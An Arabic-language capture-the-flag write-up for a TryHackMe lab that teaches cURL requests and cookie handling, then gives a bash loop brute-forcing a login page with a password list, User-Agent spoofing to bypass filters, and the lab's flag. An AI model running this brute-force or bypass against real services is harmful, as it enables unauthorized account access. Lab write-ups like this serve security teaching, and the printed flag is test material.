# Exploitation with cURL - Hoperation Eggsploit


### أول حاجة: تجربة طلب GET

-   لو كتبت أمر زي ده:

```ruby
curl http://MACHINE_IP/
```

-   ده معناه إنك بتطلب الصفحة الرئيسية (Homepage) من السيرفر.

-   الرد هيكون HTML الصفحة، لكن بدل ما يتعرض كصفحة ويب، هيتعرض كنص في التيرمنال.

* * * * *

### طلب POST (زي لما بتسجل دخول)

-   لو عندك نموذج تسجيل دخول بيستخدم POST (غالبًا بيبعت بيانات زي اسم المستخدم وكلمة السر)، ممكن تحاكي الطلب ده بأمر cURL:

```ruby
curl -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
```

-   هنا:

    -   `-X POST` معناه نوع الطلب POST مش GET.

    -   `-d` معناها البيانات اللي بتتبعت مع الطلب، في الشكل اللي بيبعتها الفورم العادي.

* * * * *

### لو عايز تشوف كل الرد (مع الهيدرز)

-   تضيف `-i` كده:

```ruby
curl -i -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
```

-   هتشوف معلومات زيادة زي الهيدرز (مثلاً لو السيرفر بعت لك كوكيز).

* * * * *

### التعامل مع الكوكيز (الحفاظ على الجلسة)

-   لما تسجل دخول، السيرفر بيبعت لك "كوكيز" عشان يعرف إنك لسة داخل.

#### حفظ الكوكيز:

```ruby
curl -c cookies.txt -d "username=admin&password=admin" http://MACHINE_IP/session.php
```

-   `-c cookies.txt` يعني خلي الكوكيز اللي السيرفر بعتها تتخزن في ملف اسمه cookies.txt.

#### استخدام الكوكيز في طلبات تانية:

```ruby
curl -b cookies.txt http://MACHINE_IP/session.php
```

-   `-b cookies.txt` معناها خلي cURL يرسل الكوكيز اللي خزنتها في الملف ده مع الطلب الجديد.



----

أتمتة تسجيل الدخول وعمل هجوم Brute Force باستخدام cURL
======================================================

* * * * *

### 1\. فكرة الهجوم Brute Force هنا:

-   فيه صفحة تسجيل دخول ضعيفة (مثلاً `bruteforce.php`).

-   إحنا عارفين اسم المستخدم (مثلاً "admin") وعايزين نجرب مجموعة كلمات مرور (passwords) واحدة واحدة لحد ما نلاقي الصح.

* * * * *

### 2\. الخطوة الأولى: تجهيز قائمة كلمات المرور

-   هتعمل ملف اسمه `passwords.txt`

-   تكتب فيه كلمات المرور اللي عايز تجربها، زي:

```
admin123 password
letmein
secretpass
secret
```

* * * * *

### 3\. الخطوة الثانية: كتابة سكربت باش (loop.sh) عشان يجرب كل كلمة مرور

```bash
for pass in $(cat passwords.txt); do
   echo  "Trying password: $pass"
   response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
   if  echo  "$response" | grep -q "Welcome"; then
     echo  "[+] Password found: $pass"
     break
   fi  done
```

**شرح السكربت:**

-   `for pass in $(cat passwords.txt)`\
    دي بتقرأ كل كلمة مرور من الملف واحدة واحدة.

-   `curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php`\
    بيبعت طلب POST لتسجيل الدخول بكلمة المرور الحالية بصمت (`-s` عشان مفيش حاجة تظهر أثناء التشغيل).

-   `response=$(...)`\
    بيخزن الرد اللي جاي من السيرفر في متغير اسمه `response`.

-   `if echo "$response" | grep -q "Welcome"`\
    بيشوف إذا الرد فيه كلمة "Welcome" (ده ممكن يكون مؤشر على نجاح تسجيل الدخول).

-   لو لقى كلمة "Welcome"، هيطبع كلمة المرور الصح ويخرج من الحلقة `break`.

* * * * *

### 4\. الخطوة الثالثة: تشغيل السكربت

-   هتدي صلاحيات تنفيذ للسكربت:

```
chmod +x loop.sh 
```

-   وبعدين تشغله:

```
./loop.sh
```

لو كلمة المرور صح، هتظهرلك رسالة بتقولك إنها اتوجدت.

* * * * *

### 5\. بالنسبة للتحقق من الـ User-Agent (تجنب الحظر)

-   بعض السيرفرات بتمنع طلبات cURL لأنها بتشوف الـ User-Agent اللي بيكون عادة `curl/7.x.x`

-   ممكن نغير الـ User-Agent باستخدام الخيار `-A`

مثال:

```
curl -A "internalcomputer" http://MACHINE_IP/ua_check.php
```

-   لو السيرفر قبل الطلب ده بس رفض طلب بـ User-Agent الافتراضي، يبقى انت كده عدّيت الحماية دي.




----


```
curl -X POST -d "username=admin&password=admin" http://10.65.140.108/post.php
```

<img width="1883" height="240" alt="image" src="https://github.com/user-attachments/assets/3ee26377-5577-4c1a-b23a-4058b1bd0e5f" />


```
curl -c cookie.txt -d "username=admin&password=admin" http://10.65.140.108/cookie.php
curl -b cookie.txt -d "username=admin&password=admin" http://10.65.140.108/cookie.php -X post
```


<img width="1904" height="289" alt="image" src="https://github.com/user-attachments/assets/ca32b1ba-d230-4838-8511-7d9de65ce137" />



```bash
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.65.140.108/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Congratulation Frankishtien Password is: $pass"
    break
  fi
done

```


<img width="1739" height="249" alt="image" src="https://github.com/user-attachments/assets/08c6f0a0-7b1a-493f-9d71-a9510a067aad" />



```
curl -i -A "TBFC" http://10.65.140.108/agent.php
```

<img width="1904" height="265" alt="image" src="https://github.com/user-attachments/assets/d71376ca-639a-46a8-8a6c-7d83e7695e86" />

```
THM{user_agent_filter_bypassed}
```


---

# Bonus Question

```
curl http://10.65.140.108/terminal.php?action=panel
```
 
<img width="1166" height="48" alt="image" src="https://github.com/user-attachments/assets/dce821f0-05ba-4e9d-8636-7009dbd22012" />

```
curl http://10.65.140.108/terminal.php?action=panel -A "secretcomputer"
```

<img width="1220" height="336" alt="image" src="https://github.com/user-attachments/assets/0735c480-a0f0-4247-9bac-c4d78ed389a9" />











